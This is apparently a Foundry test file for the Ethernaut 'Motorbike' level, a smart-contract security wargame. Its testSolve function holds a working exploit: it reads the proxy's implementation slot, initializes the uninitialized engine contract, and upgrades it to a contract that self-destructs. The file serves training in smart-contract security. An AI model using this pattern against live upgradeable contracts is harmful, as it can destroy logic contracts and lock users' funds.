// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {DummyFactory} from "src/levels/DummyFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

interface Engine {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external payable;
}

contract TestMotorbike is Test, Utils {
    Ethernaut ethernaut;
    address payable instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DummyFactory factory = DummyFactory(getOldFactory("MotorbikeFactory"));
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = payable(createLevelInstance(ethernaut, Level(address(factory)), 0));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, instance));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player);

        address engine = address(
            uint160(uint256(vm.load(instance, hex"360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")))
        );
        Engine(engine).initialize();
        Engine(engine).upgradeToAndCall(address(this), abi.encodeWithSignature("done()"));
        assertTrue(submitLevelInstance(ethernaut, instance));
    }

    function done() public {
        selfdestruct(payable(address(0)));
    }
}
